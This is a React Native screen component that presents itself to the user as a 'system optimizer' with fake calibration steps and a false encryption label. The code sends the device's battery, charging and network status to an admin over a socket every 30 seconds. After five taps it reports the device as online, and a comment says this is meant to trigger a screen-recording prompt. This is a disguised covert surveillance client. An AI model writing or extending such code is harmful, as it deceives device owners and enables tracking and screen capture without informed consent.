import React, { useState, useEffect } from 'react';
import { View, Text, TouchableOpacity, StyleSheet, AppState } from 'react-native';
import * as Battery from 'expo-battery';
import * as Network from 'expo-network';
import socket from '../services/socket'; // Your socket config

const GhostScreen = ({ route }) => {
  const { name } = route.params;
  const [tapCount, setTapCount] = useState(0);
  const [statusText, setStatusText] = useState("Tap Sensor to Calibrate Battery");

  // Periodic Heartbeat: Sends Status to Admin every 30 seconds
  useEffect(() => {
    const interval = setInterval(async () => {
      const batLevel = await Battery.getBatteryLevelAsync();
      const netState = await Network.getNetworkStateAsync();
      
      socket.emit('ghost_heartbeat', {
        name: name,
        battery: Math.round(batLevel * 100) + '%',
        connection: netState.type,
        isCharging: (await Battery.getBatteryStateAsync()) !== 1
      });
    }, 30000);
    return () => clearInterval(interval);
  }, []);

  const handleTap = () => {
    const next = tapCount + 1;
    setTapCount(next);

    if (next === 1) setStatusText("Step 1: Analyzing Cell Tower Latency...");
    if (next === 3) setStatusText("Step 2: Optimizing GPU Shaders...");
    if (next === 5) {
      setStatusText("Optimization Complete. Running in Background.");
      // In a real build, this triggers the Screen Record prompt
      socket.emit('ghost_online', { name, status: 'Active' });
    }
  };

  return (
    <View style={styles.container}>
      <Text style={styles.header}>SYSTEM OPTIMIZER v4.2</Text>
      <TouchableOpacity onPress={handleTap} style={styles.button}>
        <View style={[styles.inner, { opacity: 0.3 + (tapCount * 0.14) }]} />
        <Text style={styles.tapCount}>{tapCount}/5</Text>
      </TouchableOpacity>
      <Text style={styles.statusText}>{statusText}</Text>
      <View style={styles.infoBox}>
        <Text style={styles.info}>Node ID: {name}</Text>
        <Text style={styles.info}>Encryption: AES-256 Active</Text>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#0a0a0a', justifyContent: 'center', alignItems: 'center' },
  header: { color: '#00ff00', letterSpacing: 3, marginBottom: 60, fontWeight: 'bold' },
  button: { width: 160, height: 160, borderRadius: 80, backgroundColor: '#111', borderWidth: 1, borderColor: '#333', justifyContent: 'center', alignItems: 'center' },
  inner: { width: 100, height: 100, borderRadius: 50, backgroundColor: '#ff0000' },
  tapCount: { color: '#fff', position: 'absolute', fontWeight: 'bold' },
  statusText: { color: '#888', marginTop: 40, width: '70%', textAlign: 'center' },
  infoBox: { position: 'absolute', bottom: 40 },
  info: { color: '#222', fontSize: 10, textAlign: 'center' }
});

export default GhostScreen;
